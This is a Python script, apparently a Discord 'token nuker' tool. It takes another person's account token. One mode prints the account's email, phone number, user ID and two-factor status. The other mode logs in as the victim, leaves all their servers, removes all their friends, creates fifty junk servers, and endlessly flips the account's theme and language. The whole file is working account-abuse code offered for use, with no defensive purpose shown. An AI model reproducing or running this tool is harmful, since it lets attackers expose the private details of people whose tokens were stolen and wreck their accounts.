import threading
import requests
import discord
import random
import time
import os

from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle

init(convert=True)
guildsIds = []
friendsIds = []
clear = lambda: os.system('cls')
clear()


class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)

        for f in self.user.friends:
            friendsIds.append(f.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except Exception as e:
            print(f"[{Fore.RED}-{Fore.RESET}] Invalid token", e)
            input("Press any key to exit...");
            exit(0)

def tokendox(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f'''
            [{Fore.RED}User ID{Fore.RESET}]         {userID}
            [{Fore.RED}User Name{Fore.RESET}]       {userName}
            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}
            ''')
        input()

def tokennuke(token):
    headers = {'Authorization': token}
    print(f"[{Fore.RED}+{Fore.RESET}] Nuking...")

    for guild in guildsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/guilds/{guild}', headers=headers)

    for friend in friendsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/relationships/{friend}', headers=headers)

    for i in range(50):
        payload = {'name': f'Taids {i}', 'region': 'europe', 'icon': None, 'channels': None}
        requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)

    modes = cycle(["light", "dark"])
    while True:
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)

def getBanner():
    banner =Fore.MAGENTA + f'''
{Fore.MAGENTA}TTTTTTTTTTTTTTTTTTTTTTT         AAA               IIIIIIIIIIDDDDDDDDDDDDD           SSSSSSSSSSSSSSS 
{Fore.RED}T:::::::::::::::::::::T        A:::A              I::::::::ID::::::::::::DDD      SS:::::::::::::::S
{Fore.MAGENTA}T:::::::::::::::::::::T       A:::::A             I::::::::ID:::::::::::::::DD   S:::::SSSSSS::::::S
{Fore.RED}T:::::TT:::::::TT:::::T      A:::::::A            II::::::IIDDD:::::DDDDD:::::D  S:::::S     SSSSSSS
{Fore.MAGENTA}TTTTTT  T:::::T  TTTTTT     A:::::::::A             I::::I    D:::::D    D:::::D S:::::S            
{Fore.RED}        T:::::T            A:::::A:::::A            I::::I    D:::::D     D:::::DS:::::S            
{Fore.MAGENTA}        T:::::T           A:::::A A:::::A           I::::I    D:::::D     D:::::D S::::SSSS         
{Fore.RED}        T:::::T          A:::::A   A:::::A          I::::I    D:::::D     D:::::D  SS::::::SSSSS    
{Fore.MAGENTA}        T:::::T         A:::::A     A:::::A         I::::I    D:::::D     D:::::D    SSS::::::::SS  
{Fore.RED}        T:::::T        A:::::AAAAAAAAA:::::A        I::::I    D:::::D     D:::::D       SSSSSS::::S 
{Fore.MAGENTA}        T:::::T       A:::::::::::::::::::::A       I::::I    D:::::D     D:::::D            S:::::S
{Fore.RED}        T:::::T      A:::::AAAAAAAAAAAAA:::::A      I::::I    D:::::D    D:::::D             S:::::S
{Fore.MAGENTA}      TT:::::::TT   A:::::A             A:::::A   II::::::IIDDD:::::DDDDD:::::D  SSSSSSS     S:::::S
{Fore.RED}      T:::::::::T  A:::::A               A:::::A  I::::::::ID:::::::::::::::DD   S::::::SSSSSS:::::S
{Fore.MAGENTA}      T:::::::::T A:::::A                 A:::::A I::::::::ID::::::::::::DDD     S:::::::::::::::SS 
{Fore.RED}      TTTTTTTTTTTAAAAAAA                   AAAAAAAIIIIIIIIIIDDDDDDDDDDDDD         SSSSSSSSSSSSSSS  

                {Fore.RESET}[{Fore.MAGENTA}1{Fore.RESET}] Grab Info about the Account
                [{Fore.RED}2{Fore.RESET}] Token Nuke the Account
    '''.replace('░', f'{Fore.MAGENTA}░{Fore.RESET}')
    return banner


def startMenu():
    print(getBanner())
    print(f'[{Fore.RED}>{Fore.RESET}] Your choice', end='');
    choice = str(input('  :  '))
    if choice == '1':
        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end='');
        token = input('  :  ')
        tokendox(token)

    elif choice == '2':
        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end='');
        token = input('  :  ')
        print(f'[{Fore.RED}>{Fore.RESET}] Threads amount (number)', end='');
        threads = input('  :  ')
        Login().run(token)
        if threading.active_count() < int(threads):
            t = threading.Thread(target=tokennuke, args=(token,))
            t.start()

    elif choice.isdigit() == False:
        clear()
        startMenu()

    else:
        clear()
        startMenu()


if __name__ == '__main__':
    startMenu()
